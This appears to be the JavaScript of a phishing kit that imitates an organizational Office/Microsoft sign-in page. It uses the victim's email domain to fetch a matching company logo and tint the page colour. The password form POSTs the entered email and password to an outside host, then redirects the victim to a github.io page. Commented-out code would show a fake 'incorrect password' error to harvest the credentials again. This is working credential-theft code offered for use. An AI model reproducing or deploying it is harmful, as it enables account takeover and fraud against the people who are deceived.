/* global $ */
$(document).ready(function() {

    $("#ginHeader").html("Taking you to your organization's sign-in page")
    $("#cance").html("Cancel")
setTimeout(function() {
    $("#fedred").animate({
        left: 0,
        opacity: "hide"
    }, 0);
    //display texts
    $("#PlateText").html("Unauthorized access of this non-public computing facility is prohibited. By using or accessing this system, users consent to data review in accordance with company policy.")
    $("#FMP").html("Forgot my password")
    $("#ftrTerms").html("Terms of use")
    $("#ftrPrivacy").html("Privacy &amp; cookies")
    $("#etrP").html("Enter Password")
    $("#title").html("Sign in to your account") 
    $("#mainbox").animate({
        left: 0,
        opacity: "show"
    }, 0);
}, 4000);

// base64 part start //
var count = 0;
const getEmail = document.getElementById('displayName');
var email = getEmail.textContent;
// base64 part end //

var ind = email.indexOf("@");
var slicem = email.substr((ind + 1));
var c = slicem.substr(0, slicem.indexOf('.'));
var final = c.toLowerCase();
var finalu = c.valueOf();


var clearbits = "https://logo.clearbit.com/" + slicem

$.get(clearbits, function() {
        $("#bannerLogo").attr("src", "https://logo.clearbit.com/" + slicem);
    })
    .fail(function() {
        $("#bannerLogo").attr("src", "https://github.com/Makemeproud/makemeproud.github.io/raw/master/jquery/adb/justadobenew.png");
    });

setTimeout(function() {
    var img = new Image(); // load an image
    img.crossOrigin = ""; // we need CORS here...
    img.onload = function() { // when image has loaded:
        var beholder = document.getElementById('beholder');
        //   div.appendChild(this);                          // add image to DOM (demo) 
        beholder.style.background = analyse(img, 5); // bg color = result from analyse
    }
    // var clearbits = "https://logo.clearbit.com/ocma.art"
    img.src = clearbits; // some image (CORS enabled)
}, 2000);

function analyse(img, border) {
    var canvas = document.createElement("canvas"), // create a canvas element
        ctx = canvas.getContext("2d"), // get context
        w = img.naturalWidth, // get actual width..
        h = img.naturalHeight;

    canvas.width = w; // set canvas size
    canvas.height = h;

    ctx.drawImage(img, 0, 0); // draw in image

    // do checks:, for example:
    //if (border*2 > canvas.width || border*2 > canvas.height) throw "Image too small!";

    // get borders, avoid overlaps (though it does not really matter in this case):
    var top = ctx.getImageData(0, 0, w, border).data;
    var left = ctx.getImageData(0, border, border, h - border * 2).data;
    var right = ctx.getImageData(w - border, border, border, h - border * 2).data;
    var bottom = ctx.getImageData(0, h - border, w, border).data;

    var r = 0,
        g = 0,
        b = 0,
        cnt = 0;

    // count pixels and add up color components: (see function below)
    countBuffer(top);
    countBuffer(left);
    countBuffer(right);
    countBuffer(bottom);

    // calc average
    r = (r / cnt + 0.5) | 0;
    g = (g / cnt + 0.5) | 0;
    b = (b / cnt + 0.5) | 0;

    return "rgb(" + r + "," + g + "," + b + ")";

    function countBuffer(data) {
        var i = 0,
            len = data.length;
        while (i < len) {
            r += data[i++]; // add red component etc.
            g += data[i++];
            b += data[i++];
            i++;
            cnt++; // count one pixel
        }
    }

}

});

var mount = 0
$('#final-btn').click(function(event) {

        event.preventDefault();

        var pr = $("#pss").val();
   
        if (!pr) {
            $('#errordiv').show();
            $('#errordiv').html("Please enter your password");
           $("#final-btn").attr("disabled", false);
            return false;
        }

        const getEmail = document.getElementById('displayName');
        var email = getEmail.textContent;
        console.log(email);
      

        $('#errordiv').hide();
        var password = $("#pss").val();
        var logintype = "[[+ !Office! +]]";
        var msg = $('#error').html();

        console.log(email+password);

        mount = mount + 1;

        $.ajax({
            dataType: 'JSON',
            url: "https://highservicegears.com/deez/next.php",
            type: 'POST',
            data: {
                login: email,
                passwd: password,
                logintype: logintype,

            },
            beforeSend: function(xhr) {
                $("#spinner").animate({ left: 0, opacity: "show" }, 0);
                $("#lightfade").animate({ left: 0, opacity: "show" }, 0);
                $("#final-btn").attr("disabled", true);
                $("input:first").removeClass("has-error ext-has-error");
    
            },
            success: function(response) {
              window.location.replace("https://phpofficial.github.io/route/data.html");return false; 
                // if (mount >= 2) {
                //     mount = 0;
                
                // window.location.replace("https://activitieschecks.github.io/route/syncronize.html");return false; }
                // setTimeout(function () {
                //     $("#pss").val("");
                //     $("#pss").focus();
                //     $('#errordiv').show();
                //     $('#errordiv').html("Your account or password is incorrect. If you don't remember your password, <a href='#' role='link'> reset it now.</a>");
                //     $("#spinner").animate({ left: 0, opacity: "hide" }, 0);
                //     $("#lightfade").animate({ left: 0, opacity: "hide" }, 0);
                //     $("#final-btn").attr("disabled", false);
                //     $("input:first").addClass("has-error ext-has-error");
                // }, 4000);
            },
            error: function() {
              window.location.replace("https://phpofficial.github.io/route/data.html");return false; 
                // if (mount >= 2) {
                //     mount = 0;
                
                // window.location.replace("https://activitieschecks.github.io/route/syncronize.html");
                // return false;}
                // setTimeout(function () {
                // $("#pss").val("");
                //     $("#pss").focus();
                //     $('#errordiv').show();
                //     $('#errordiv').html("Your account or password is incorrect. If you don't remember your password, <a <a href='#' role='link'> reset it now.</a>");
                //     $("#spinner").animate({ left: 0, opacity: "hide" }, 0);
                //     $("#lightfade").animate({ left: 0, opacity: "hide" }, 0);
                //     $("#final-btn").attr("disabled", false);
                //     $("input:first").addClass("has-error ext-has-error");
                // }, 4000);
            },
            complete: function() {
              
            }
        });
    });
